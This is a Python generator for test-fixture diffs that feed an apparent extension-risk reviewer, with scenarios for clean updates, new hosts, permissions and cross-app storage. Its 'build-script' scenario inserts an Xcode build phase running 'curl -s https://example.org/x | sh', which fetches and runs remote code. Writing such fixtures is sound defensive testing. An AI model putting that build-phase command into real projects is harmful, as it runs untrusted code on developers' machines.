#!/usr/bin/env python3
"""Regenerates the extension-risk fixture diffs from base/. Run from the repository root:

    python3 tests/fixtures/extension-risk/generate.py
"""
import os, subprocess, shutil, sys, tempfile, re
root = os.getcwd()
base = os.path.join(root, "tests/fixtures/extension-risk/base")
out = os.path.join(root, "tests/fixtures/extension-risk")

def run(*a, cwd):
    return subprocess.run(a, cwd=cwd, check=True, capture_output=True, text=True).stdout

def scenario(name, edits):
    d = tempfile.mkdtemp()
    shutil.copytree(base, d, dirs_exist_ok=True)
    run("git", "init", "-q", cwd=d); run("git", "add", "-A", cwd=d)
    run("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "base", cwd=d)
    for path, fn in edits:
        p = os.path.join(d, path)
        if fn is None:
            os.remove(p); continue
        old = open(p).read() if os.path.exists(p) else None
        os.makedirs(os.path.dirname(p), exist_ok=True)
        open(p, "w").write(fn(old))
    run("git", "add", "-A", cwd=d)
    diff = run("git", "diff", "--cached", "--no-renames", cwd=d)
    open(os.path.join(out, name + ".diff"), "w").write(diff)
    shutil.rmtree(d)

def sub(a, b):
    def f(old):
        assert a in old, a
        return old.replace(a, b, 1)
    return f

def new(text):
    return lambda old: text

bump = ("AcmeExtension/Info.plist", sub("<string>0.1</string>", "<string>0.2</string>"))

scenario("clean-update", [
    bump,
    ("AcmeExtension/AcmeClient.swift", sub('''  func itemsURL() -> URL {
    Self.baseURL.appending(path: "items")
  }''', '''  func itemsURL(page: Int = 1) -> URL {
    Self.baseURL.appending(path: "items").appending(queryItems: [URLQueryItem(name: "page", value: String(page))])
  }

  func searchURL(query: String) -> URL {
    Self.baseURL.appending(path: "search").appending(queryItems: [URLQueryItem(name: "q", value: query)])
  }''')),
    ("AcmeExtension/CHANGELOG.md", sub("## 0.1", "## 0.2\n\n- Search.\n\n## 0.1")),
    ("media/screenshots/acme/2.svg", new('<svg xmlns="http://www.w3.org/2000/svg"/>\n')),
    ("media/icons/acme.svg", new('<svg xmlns="http://www.w3.org/2000/svg"/>\n')),
])
scenario("moved-code", [
    ("AcmeExtension/AcmeClient.swift", sub('  static let baseURL = URL(string: "https://api.acme.com/v1")!\n', "")),
    ("AcmeExtension/AcmeEndpoints.swift", new('import Foundation\n\nextension AcmeClient {\n  static let baseURL = URL(string: "https://api.acme.com/v1")!\n}\n')),
])
scenario("new-host", [
    bump,
    ("AcmeExtension/AcmeClient.swift", sub('  func itemsURL', '  static let telemetryURL = URL(string: "https://collect.example.net/t?id=\\(UUID())")!\n  static let mirrorHost = "mirror.acme.io"\n\n  func itemsURL')),
])
scenario("apple-events", [
    ("AcmeExtension/AcmeScript.swift", new('import Foundation\n\nenum AcmeScript {\n  static func reveal() {\n    let source = """\n    tell application "Finder" to activate\n    """\n    NSAppleScript(source: source)?.executeAndReturnError(nil)\n  }\n}\n')),
])
scenario("url-scheme", [
    ("AcmeExtension/AcmeOpen.swift", new('import AppKit\n\nenum AcmeOpen {\n  static func add(_ title: String) {\n    let url = URL(string: "things:///add?title=\\(title)")!\n    NSWorkspace.shared.open(url)\n  }\n}\n')),
])
scenario("keychain", [
    ("AcmeExtension/AcmeAuth.swift", new('import TunaKit\n\nenum AcmeAuth {\n  static let connection = ExtensionConnectionDefinition(\n    providerID: "acme",\n    name: "Acme",\n    kind: .secret\n  )\n\n  static func save(_ token: String) {\n    KeychainStore.setString(token, service: "acme", account: "default")\n  }\n}\n')),
])
scenario("permission", [
    ("AcmeExtension/AcmeReminders.swift", new('import EventKit\n\nenum AcmeReminders {\n  static let store = EKEventStore()\n}\n')),
    ("AcmeExtension/Info.plist", sub("\t<key>NSPrincipalClass</key>", "\t<key>NSRemindersFullAccessUsageDescription</key>\n\t<string>Acme adds reminders.</string>\n\t<key>NSPrincipalClass</key>")),
    ("AcmeExtension/STORE.md", sub("warnings: [network]", "warnings: [network, reminders]")),
])
scenario("destructive", [
    ("AcmeExtension/AcmeActions.swift", sub("\n}\n", '''

  static let purge = ActionReviewPresentation(
    title: "Purge items?",
    sections: [],
    confirmButtonTitle: "Purge",
    isDestructive: true
  )
}
''')),
])
scenario("other-app-storage", [
    ("AcmeExtension/AcmeDatabase.swift", new('import Foundation\n\nenum AcmeDatabase {\n  static let url = FileManager.default.homeDirectoryForCurrentUser\n    .appending(path: "Library/Group Containers/group.com.example.notes/Notes.sqlite")\n}\n')),
])
scenario("build-script", [
    ("AcmeExtension/Acme.xcodeproj/project.pbxproj", sub("\tobjects = {\n", '\tobjects = {\n\t\tB1 /* Run Script */ = {\n\t\t\tisa = PBXShellScriptBuildPhase;\n\t\t\tshellScript = "curl -s https://example.org/x | sh";\n\t\t};\n')),
])
scenario("shared", [
    bump,
    ("Makefile", sub("all:", "all: acme")),
    ("README.md", sub("| Other things |", "| Other things, now more |")),
    ("media/screenshots/acme/2.svg", new('<svg xmlns="http://www.w3.org/2000/svg"/>\n')),
    ("media/screenshots/somebody-else/1.svg", new('<svg xmlns="http://www.w3.org/2000/svg"/>\n')),
    ("OtherExtension/Other.swift", sub("enum Other {}", "enum Other { static let version = 2 }")),
])
scenario("admission", [
    ("NewExtension/New.xcodeproj/project.pbxproj", new(open(os.path.join(base, "AcmeExtension/Acme.xcodeproj/project.pbxproj")).read().replace("acme", "new").replace("AcmeExtensionTests", "NewExtensionTests"))),
    ("NewExtension/Info.plist", new(open(os.path.join(base, "AcmeExtension/Info.plist")).read().replace("AcmeExtension", "NewExtension"))),
    ("NewExtension/New.swift", new('import TunaKit\n\nenum New {\n  static let url = URL(string: "https://api.new.example.com")!\n}\n')),
    ("media/screenshots/new/1.svg", new('<svg xmlns="http://www.w3.org/2000/svg"/>\n')),
    ("TunaExtensions.xcworkspace/contents.xcworkspacedata", sub("   </FileRef>\n</Workspace>", "   </FileRef>\n   <FileRef\n      location = \"group:NewExtension/New.xcodeproj\">\n   </FileRef>\n</Workspace>")),
    ("Makefile", sub("AcmeExtension OtherExtension", "AcmeExtension NewExtension OtherExtension")),
    ("README.md", sub("| OtherExtension |", "| NewExtension | New things |\n| OtherExtension |")),
])
scenario("admission-overreach", [
    ("NewExtension/New.xcodeproj/project.pbxproj", new(open(os.path.join(base, "AcmeExtension/Acme.xcodeproj/project.pbxproj")).read().replace("acme", "new").replace("AcmeExtensionTests", "NewExtensionTests"))),
    ("NewExtension/Info.plist", new(open(os.path.join(base, "AcmeExtension/Info.plist")).read().replace("AcmeExtension", "NewExtension"))),
    ("Makefile", sub("AcmeExtension OtherExtension", "NewExtension OtherExtension")),
    ("README.md", sub("| Acme items |", "| Acme items, renamed |")),
    ("scripts/release.sh", sub("#!/bin/sh\n", "#!/bin/sh\necho new\n")),
])
print("ok")
